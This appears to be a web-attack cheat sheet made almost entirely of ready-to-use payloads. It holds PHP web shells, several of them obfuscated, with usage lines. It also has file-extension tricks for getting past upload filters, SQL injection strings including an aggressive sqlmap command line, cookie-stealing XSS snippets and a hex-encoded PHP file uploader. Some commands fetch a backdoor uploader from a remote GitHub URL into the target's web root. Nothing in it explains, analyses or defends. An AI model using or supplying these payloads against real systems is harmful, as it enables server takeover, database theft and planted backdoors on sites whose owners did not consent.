# Other
```
system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen()
<?=`$_GET[0]`?>
<?=`ls -la`?>
${@print('test')}
${@system('ls -la')}
<?php phpinfo(); ?>
<?php system('dir'); ?>
<?php system('tail /etc/passwd'); ?>
<?php echo "<pre>"; system($_GET[cmd]); ?> 
<?php system('wget https://redacted.com/yourfile.php'); ?>
system('curl https://raw.githubusercontent.com/kontolodon7/backdoor/main/uploader-encrypt.php -o /path/p.php');
```
# Extension Bypass
```
php2.php3.php4.php5.php6.php7.phps.phps.pht.phtm.phtml.pgif.shtml.htaccess.phar.inc.hphp.ctp.module.asp.aspx.config.ashx.asmx.aspq.axd.cshtm.cshtml.rem.soap.vbhtm.vbhtml.asa.cer.inc.suspected
file.p.phpp file.php.php file.php%00.jpg
file.php%00.jpg file.txt.jpg.png.asp
file.asp\ shell.asp.\
pHp, .pHP5, .PhAr
file.php%20 file.php%0a file.php%00 file.php%0d%0a file.php.... file.pHp5....
file.php#.png file.php%00.png file.php\x00.png file.php%0a.png file.php%0d%0a.png file.php%00.png%00.jpg

```
# Webshell 1
```
<?=`$_POST[0]`?>
[*] Usage: curl -X POST http://example.com/path/to/shell.php -d "0=command"
```
# Webshell 2
```
<?=`{$_REQUEST['_']}`?>
[*] Usage:
 - http://target.com/path/to/shell.php?_=command
 - curl -X POST http://target.com/path/to/shell.php -d "_=command"
```
# Webshell 3
```
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
[*] Usage: http://target.com/path/to/shell.php?0=command
[*] Note: This is obfuscation of <?=`$_GET[0]`?>
```
# Webshell 4
```
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
[*] Usage: http://target.com/path/to/shell.php?_=function&__=argument
[*] E.g.: http://target.com/path/to/shell.php?_=system&__=ls
```
# Webshell 5
```
<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>
<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]); ?>
[*] Usage: http://target.com/path/to/shell.php?0=function&1=argument
[*] E.g.: http://target.com/path/to/shell.php?0=system&1=ls
```
# SQL Injection
```
if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"/*)
if(1=1,sleep(10),0)(/*')XOR(if(1=1,sleep(10),0))OR('")XOR(if(1=1,sleep(10),0))OR("*/
(select*from(select(sleep(5)))a)
'='or'
'='OR'@gmail.com
test@gmail.com' OR 1=1 --
' or 1=1 limit 1 -- -+
--random-agent --threads=5 --risk=3 --level=5 --invalid-string --invalid-logical --invalid-bignum --tamper=between,informationschemacomment,charencode,bluecoat --force-ssl -v2 --parse-errors --current-db --dbs
concat(0x496e6a65637465642042792053756c74616e20,'<br>','<br>',0x55736572203a20,user(),'<br>',0x56657273696f6e203a20,version(),'<br>',0x4461746162617365203a20,database(),'<br>',(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
```
# XSS
```
<img src=xss onerror=alert(1)>
“><img src=x onerror=prompt(document.domain)>
"><script>alert(document.location="https://Instagram.com/")</script>
"><script>alert(document.cookie)</script>
javascript:alert('document.cookie')
"onmouseover="alert('xxs')"
<svg onload=alert%26%230000000040"1")>
```
# Uploader
```
0x3c3f706870206563686f202755706c6f616465723c62723e27203b6563686f2020273c62723e27203b6563686f20273c666f726d20616374696f6e3d222022206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e27203b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2275706c6f6164223e3c2f666f726d3e27203b696628245f504f53545b275f75706c275d20203d3d202275706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e75706c6f6164202121213c2f623e3c62723e3c62723e27203b20207d656c7365207b206563686f20273c623e55706c6f616420212121203c2f623e3c62723e3c62723e27203b20207d7d3f3e
<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>
```
